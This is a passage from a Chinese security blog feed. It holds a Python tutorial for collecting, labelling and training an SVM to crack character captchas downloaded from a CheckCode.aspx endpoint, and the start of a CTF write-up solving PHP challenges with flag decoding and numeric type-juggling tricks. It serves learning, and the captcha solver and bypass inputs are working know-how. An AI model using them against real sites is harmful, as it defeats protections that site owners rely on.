href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li><code>code = var.get()</code>获取图形化界面输入的验证码的值，其类型是一个数组，其中存着四个字符。</li><li><code>for i in range(4):</code>遍历四个字符，判断输入的字符值将他们保存到<code>set\</code>目录下相应的字符。其中<code>path = os.path.join(BASE_DIR, &#39;sets&#39;, code[i])</code>是将<code>BASE_DIR, &#39;sets&#39;, code[i]</code>三个参数组合成一个路径返回给<code>path</code>,后续还用了一个<code>if else</code>来判断这个目录是否存在，不存在即用<code>makedirs</code>创建目录。并创建并更新目录其中的<code>conut.txt</code>中的值，这个值是用来记录当前路径下字符验证码图片的数量。<code>ims[i].save(charname)</code>将验证码分隔后得到的图片保存到当前目录下。</li></ul><h4 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def save_imgs():</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    ims = process_pic(tmp)</span><br><span class="line">    code = var.get()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = os.path.join(BASE_DIR, &apos;sets&apos;, code[i])</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">                char_cnt = eval(f.readline())</span><br><span class="line">        else:</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;w&apos;) as f:</span><br><span class="line">                f.write(&apos;0&apos;)</span><br><span class="line">                char_cnt = 0</span><br><span class="line">        charname = os.path.join(path, str(char_cnt + 1) + &apos;.png&apos;)</span><br><span class="line">        ims[i].save(charname)</span><br><span class="line">        filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">        with open(filepath,&apos;w+&apos;) as f:</span><br><span class="line">            f.write(str(char_cnt + 1))</span><br><span class="line">    update_cnt(tmp)</span><br></pre></td></tr></table></figure><h4 id="代码测试-2"><a href="#代码测试-2" class="headerlink" title="代码测试"></a>代码测试</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ截图20180419125209.png" alt="Alt text"></p><h3 id="预处理完整代码"><a href="#预处理完整代码" class="headerlink" title="预处理完整代码"></a>预处理完整代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">import tkinter as tk</span><br><span class="line">import requests</span><br><span class="line">from PIL import Image, ImageTk, ImageFilter</span><br><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">from matplotlib import pyplot as plt</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_cnt():</span><br><span class="line">    try:</span><br><span class="line">        with open(&apos;count.txt&apos;, &apos;r&apos;) as f:</span><br><span class="line">            cnt = f.readline()</span><br><span class="line">            cnt = eval(cnt)</span><br><span class="line">        return cnt</span><br><span class="line">    except:</span><br><span class="line">        with open(&apos;count.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">            f.write(&apos;0&apos;)</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_cnt(cnt):</span><br><span class="line">    with open(&apos;count.txt&apos;, &apos;w+&apos;) as f:</span><br><span class="line">        f.write(str(cnt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_pic(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    im = im.point(lambda i: i != 43, mode=&apos;1&apos;)</span><br><span class="line">    y_min, y_max = 0, 22  # im.height - 1 # 26</span><br><span class="line">    split_lines = [5, 17, 29, 41, 53]</span><br><span class="line">    ims = [im.crop([u, y_min, v, y_max])</span><br><span class="line">           for u, v in zip(split_lines[:-1], split_lines[1:])]</span><br><span class="line">    return ims</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_pic_for_display(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    w_box = 300</span><br><span class="line">    h_box = 200</span><br><span class="line">    im_resized = resize(w, h, w_box, h_box, im)</span><br><span class="line">    tk_image = ImageTk.PhotoImage(im_resized)</span><br><span class="line">    return tk_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def resize(w, h, w_box, h_box, pil_image):</span><br><span class="line">    f1 = w_box / w</span><br><span class="line">    f2 = h_box / h</span><br><span class="line">    factor = min([f1, f2])</span><br><span class="line">    width = int(w * factor)</span><br><span class="line">    height = int(h * factor)</span><br><span class="line">    return pil_image.resize((width, height), Image.ANTIALIAS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def display_pic():</span><br><span class="line">    global im</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    get_checkcode(tmp)</span><br><span class="line">    im = tk.PhotoImage(file=str(tmp) + &apos;.png&apos;)</span><br><span class="line">    im = get_pic_for_display(tmp)</span><br><span class="line">    picLabel[&apos;image&apos;] = im</span><br><span class="line">    cntLabel[&apos;text&apos;] = &apos;总计: &apos; + str(tmp - 1) + &apos;/1000&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def save_imgs():</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    ims = process_pic(tmp)</span><br><span class="line">    code = var.get()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = os.path.join(BASE_DIR, &apos;sets&apos;, code[i])</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">                char_cnt = eval(f.readline())</span><br><span class="line">        else:</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;w&apos;) as f:</span><br><span class="line">                f.write(&apos;0&apos;)</span><br><span class="line">                char_cnt = 0</span><br><span class="line">        charname = os.path.join(path, str(char_cnt + 1) + &apos;.png&apos;)</span><br><span class="line">        ims[i].save(charname)</span><br><span class="line">        filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">        with open(filepath, &apos;w+&apos;) as f:</span><br><span class="line">            f.write(str(char_cnt + 1))</span><br><span class="line">    update_cnt(tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def submit():</span><br><span class="line">    save_imgs()</span><br><span class="line">    display_pic()</span><br><span class="line">    var.set(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init():</span><br><span class="line">    display_pic()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global im</span><br><span class="line">app = tk.Tk()</span><br><span class="line">app.title(&apos;Labeller&apos;)</span><br><span class="line">app.geometry(&apos;500x260&apos;)</span><br><span class="line">picLabel = tk.Label(app)</span><br><span class="line">picLabel.pack()</span><br><span class="line">var = tk.StringVar()</span><br><span class="line">textInput = tk.Entry(app, textvariable=var)</span><br><span class="line">textInput.pack(expand=&apos;yes&apos;, fill=&apos;both&apos;, padx=100, side=&apos;top&apos;, pady=10)</span><br><span class="line">submitButton = tk.Button(app, text=&quot;提交&quot;, width=&apos;10&apos;, command=submit)</span><br><span class="line">submitButton.pack()</span><br><span class="line">cntLabel = tk.Label(app)</span><br><span class="line">cntLabel.pack(pady=20)</span><br><span class="line">init()</span><br><span class="line">app.mainloop()</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/labeller.gif" alt="Alt text"></p><h2 id="验证码训练"><a href="#验证码训练" class="headerlink" title="验证码训练"></a>验证码训练</h2><h3 id="加载、处理图片数据"><a href="#加载、处理图片数据" class="headerlink" title="加载、处理图片数据"></a>加载、处理图片数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def process(data):</span><br><span class="line">    for i in range(0, len(data)):</span><br><span class="line">        if(data[0][i] &gt; 0):</span><br><span class="line">            data[0][i] = 1</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def load_image(path):</span><br><span class="line">    im = Image.open(path)</span><br><span class="line">    data = np.array(im.getdata()).reshape(1, -1)</span><br><span class="line">    data = process(data)</span><br><span class="line">    return data</span><br></pre></td></tr></table></figure><ul><li><code>data = np.array(im.getdata()).reshape(1, -1)</code>中的<code>im.getdata()</code>以包含像素值的<code>sequence</code>对象形式返回图像的内容，以包含像素值的<code>sequence</code>对象形式返回图像的内容，该对象的每一个元素对应一个像素点的<code>R</code>、<code>G</code>和<code>B</code>三个值。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def get_count(path, char):</span><br><span class="line">    filepath = os.path.join(path, char, &apos;count.txt&apos;)</span><br><span class="line">    with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">        cnt = eval(f.readline())</span><br><span class="line">    return cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_label(char):</span><br><span class="line">    global char_list</span><br><span class="line">    for i in range(0, len(char_list)):</span><br><span class="line">        if char_list[i] == char:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_char_set(path, char):</span><br><span class="line">    cnt = get_count(path, char)</span><br><span class="line">    x = np.zeros((cnt, 264))</span><br><span class="line">    y = np.zeros((cnt, 1))</span><br><span class="line">    for i in range(1, cnt + 1):</span><br><span class="line">        filepath = os.path.join(path, char, str(i) + &apos;.png&apos;)</span><br><span class="line">        x[i - 1, :] = load_image(filepath)</span><br><span class="line">        y[i - 1] = get_label(char)</span><br><span class="line">    char_set = np.hstack((x, y))</span><br><span class="line">    return char_set</span><br><span class="line"></span><br><span class="line">def build_sets(path):</span><br><span class="line">    global char_list</span><br><span class="line">    sets = build_char_set(path, char_list[0])</span><br><span class="line">    for i in range(1, len(char_list)):</span><br><span class="line">        char_set = build_char_set(path, char_list[i])</span><br><span class="line">        sets = np.vstack((sets, char_set))</span><br><span class="line">    return sets</span><br></pre></td></tr></table></figure><ul><li><code>cnt = get_count(path, char)</code>通过<code>get_count()</code>函数读取相关字符目录下<code>count.txt</code>文件的数值。</li><li><code>x = np.zeros((cnt, 264))  y = np.zeros((cnt, 1))</code>返回来一个给定形状和类型的用0填充的数组，用<code>np.zeros</code>生成<code>(cnt,264)</code>和<code>(cnt,1)</code>的数组下<code>x</code>,<code>y</code>。</li><li><code>get_label()</code>函数用来读取人工标识获取的char值。<code>load_image()</code>函数用来读取文件目录下的字符。<code>for</code>循环分别填充刚刚生成的<code>y</code>,<code>x</code>数组。</li><li><code>np.hstack((x, y))</code>将填充的<code>y</code>,<code>x</code>数组将水平(按列顺序)把数组给堆叠起来。返回给<code>char_set</code>。</li><li><code>for i in range(1, len(char_list)):</code>遍历所有字符，得到所有字符的水平(按列顺序)把数组给堆叠起来的结果再用<code>sets = np.vstack((sets, char_set))</code>垂直（按照行顺序）的把数组给堆叠起来复制给<code>set</code>。</li></ul><h3 id="配置SVM模型"><a href="#配置SVM模型" class="headerlink" title="配置SVM模型"></a>配置SVM模型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def build_training_sets(sets, percent):</span><br><span class="line">    length = int(len(sets) * percent)</span><br><span class="line">    return sets[0:length, :]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_test_sets(sets, percent):</span><br><span class="line">    length = int(len(sets) * (1 - percent))</span><br><span class="line">    return sets[length:len(sets), :]</span><br></pre></td></tr></table></figure><ul><li>声明两个函数分别是<code>build_training_sets(sets, percent)</code>和<code>build_test_sets(sets, percent)</code>。这两个函数参数为<code>sets</code>和<code>percent</code>即上部分析得到的<code>sets</code>值和一个<code>百分比</code>值,用于训练集和测试集的建立。</li></ul><h3 id="加载测试集、训练集"><a href="#加载测试集、训练集" class="headerlink" title="加载测试集、训练集"></a>加载测试集、训练集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def train(training_sets):</span><br><span class="line">    x = training_sets[:, 0:264]</span><br><span class="line">    y = training_sets[:, 264].reshape(-1, 1)</span><br><span class="line">    clf = svm.LinearSVC()</span><br><span class="line">    clf.fit(x, y)</span><br><span class="line">    return clf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recognize(y):</span><br><span class="line">    global char_list</span><br><span class="line">    return char_list[y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def predict(clf, x):</span><br><span class="line">    return recognize(int(clf.predict(x)[0]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def accuracy(pred, real):</span><br><span class="line">    cnt = 0</span><br><span class="line">    for i in range(len(pred)):</span><br><span class="line">        if pred[i] == real[i]:</span><br><span class="line">            cnt = cnt + 1</span><br><span class="line">    return cnt / len(pred)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test(clf, test_sets):</span><br><span class="line">    x = test_sets[:, 0:264]</span><br><span class="line">    y = test_sets[:, 264].reshape(-1, 1)</span><br><span class="line">    length = x.shape[1]</span><br><span class="line">    pred = []</span><br><span class="line">    real = []</span><br><span class="line">    for i in range(0, length):</span><br><span class="line">        pred.append(predict(clf, x[i, :].reshape(1, -1)))</span><br><span class="line">        real.append(recognize(int(y[i])))</span><br><span class="line">    return accuracy(pred, real)</span><br></pre></td></tr></table></figure><ul><li><code>train(training_sets)</code>函数中<code>x</code>和<code>y</code>是用来生成训练集数据的，在后续函数可以得知。</li><li><code>clf = svm.LinearSVC()</code>初始化一个<code>SVM</code>模型。<code>clf.fit(x, y)</code>用<code>x</code>和<code>y</code>作为训练数据拟合模型。</li><li><code>predict(clf, x)</code>是预测<code>load_image()</code>函数用来读取文件目录下的字符的类函数</li><li><code>test(clf, test_sets)</code>函数是用来进行测试集数据处理的函数，函数中加载测试集的<code>sets</code>数据，并计算测试集精度由<code>accuracy()</code>函数返回。</li></ul><h3 id="训练、测试并更新"><a href="#训练、测试并更新" class="headerlink" title="训练、测试并更新"></a>训练、测试并更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def update_model():</span><br><span class="line">    BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">    data_path = os.path.join(BASE_DIR, &apos;sets&apos;)</span><br><span class="line">    model_path = os.path.join(BASE_DIR, &apos;model&apos;, &apos;svm.model&apos;)</span><br><span class="line">    sets = build_sets(data_path)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        np.random.shuffle(sets)</span><br><span class="line">    training_sets = build_training_sets(sets, 0.9)</span><br><span class="line">    test_sets = build_test_sets(sets, 0.1)</span><br><span class="line">    model = train(training_sets)</span><br><span class="line">    res = test(model, test_sets)</span><br><span class="line">    joblib.dump(model, model_path)</span><br><span class="line">    print(&apos;Model updated! The accuracy on test sets: &apos; + str(res))</span><br></pre></td></tr></table></figure><ul><li>从<code>update_model()</code>函数分析，这个函数用来更新模型的，显示加载相应的图像数据和<code>svm</code>模型。</li><li><code>for i in range(5):   np.random.shuffle(sets)</code>利用一个<code>for</code>循环生成5个用<code>np.random.shuffle(sets)</code>函数打乱顺序的<code>sets</code>值。</li><li>利用<code>training_sets = build_training_sets(sets, 0.9)</code>和<code>test_sets = build_test_sets(sets, 0.1)</code>,前面提到的两个函数创建训练集和测试集。</li><li><code>model = train(training_sets)</code>加载训练集，训练模型。<code>res = test(model, test_sets)</code>返回测试集的精度。</li><li><code>joblib.dump(model, model_path)</code>使用joblib保存模型到响应目录生成新的<code>SVM</code>模型。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;验证码预处理&quot;&gt;&lt;a href=&quot;#验证码预处理&quot; class=&quot;headerlink&quot; title=&quot;验证码预处理&quot;&gt;&lt;/a&gt;验证码预处理&lt;/h2&gt;&lt;h3 id=&quot;下载验证码&quot;&gt;&lt;a href=&quot;#下载验证码&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>solveme.peng.kr平台Web练习</title>
    <link href="https://uknowsec.cn/posts/notes/solveme-peng-kr%E5%B9%B3%E5%8F%B0Web%E7%BB%83%E4%B9%A0.html"/>
    <id>https://uknowsec.cn/posts/notes/solveme-peng-kr平台Web练习.html</id>
    <published>2018-03-31T06:20:54.000Z</published>
    <updated>2018-05-03T10:01:20.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近自己的状态有点迷的，想学点代码审计的东西，又感觉自己的基础太菜。整个人昏昏沉沉的，偶尔逛freebuf看到一篇web题解的文章，</p><p>作者在文章提到这个网站的Web题都是PHP审计的题目，于是看看代码，一行一行看代码，一个函数一个函数的理解。也写个题解记录以下。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &apos;&lt;hr&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>第一题是解密的题目，一个函数一个函数的理解。</p><ul><li><p>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。</p></li><li><p>strrev() 函数反转字符串。</p></li><li><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p></li><li><p>base64_encode() 使用 MIME base64 对数据进行编码。</p></li></ul><p>理解函数的意思，只需要把输出值逆向回去就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</span><br><span class="line"></span><br><span class="line">    echo hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;answer&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;answer&apos;] === &apos;痤迈愈羼滋&apos;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Wrong answer&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>以上是我用firefox浏览器打开显示的代码，我这里直接提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://badcompare.solveme.peng.kr/?answer=痤迈愈羼滋</span><br></pre></td></tr></table></figure><p>是可以的，但是在chrome不行。显示的值也不一样。</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;time&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(!is_numeric($_GET[&apos;time&apos;]))&#123;</span><br><span class="line">            echo &apos;The time must be number.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">            echo &apos;This time is too short.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">            echo &apos;This time is too long.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            sleep((int)$_GET[&apos;time&apos;]);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>看代码的意思是让我们输入一个5184000到7776000之间的数，才能通过判断输出$flag。</p><p>但是在最后他会执行sleep函数</p><ul><li>sleep() 函数延迟代码执行若干秒。</li></ul><p>这个函数需要等待很长的时间，sleep用到(int)转换为整数型</p><p>在PHP中做如下实验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo 60 * 60 * 24 * 30 * 2 ,&apos;&lt;br&gt;&apos;;//5184000</span><br><span class="line"></span><br><span class="line">echo 60 * 60 * 24 * 30 * 3,&apos;&lt;br&gt;&apos;;//7776000</span><br><span class="line"></span><br><span class="line">echo (int)&apos;123abc&apos; ,&apos;&lt;br&gt;&apos;;//123</span><br><span class="line"></span><br><span class="line">echo (int)&apos;1abc23&apos; ,&apos;&lt;br&gt;&apos;;//1</span><br><span class="line"></span><br><span class="line">echo (int)&apos;abc123&apos; ,&apos;&lt;br&gt;&apos;;//0</span><br><span class="line"></span><br><span class="line">echo 6e6 ,&apos;&lt;br&gt;&apos;;//6000000</span><br><span class="line"></span><br><span class="line">echo 